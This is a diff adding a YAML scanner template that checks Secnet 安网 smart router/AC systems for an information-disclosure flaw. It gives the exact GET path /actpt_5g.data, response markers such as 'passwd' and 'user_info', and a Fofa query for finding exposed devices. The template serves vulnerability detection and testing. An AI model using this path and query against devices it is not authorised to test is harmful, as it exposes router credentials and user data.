@@ -1,0 +1,27 @@
+id: secnet-router-actpt-5g-data-disclosure
+
+info:
+  name: Secnet 智能路由系统 actpt_5g.data 信息泄露
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    secnet安网智能AC管理系统是广州安网通信技术有限公司（简称“安网通信”）的无线AP管理系统。secnet安网智能AC管理系统存在信息漏洞，攻击者可利用该漏洞获取敏感信息。
+    Fofa: title="安网-智能路由系统" || header="HTTPD_ac 1.0"
+  reference:
+    - https://mp.weixin.qq.com/s/lNlI5ZtUJG50ipS0WfytUw
+  tags: secnet,actpt_5g
+  created: 2023/11/28
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /actpt_5g.data
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'ap_info') && 
+      response.body.bcontains(b'passwd') && 
+      response.body.bcontains(b'ssids') &&
+      response.body.bcontains(b'user_info')
+expression: r0()
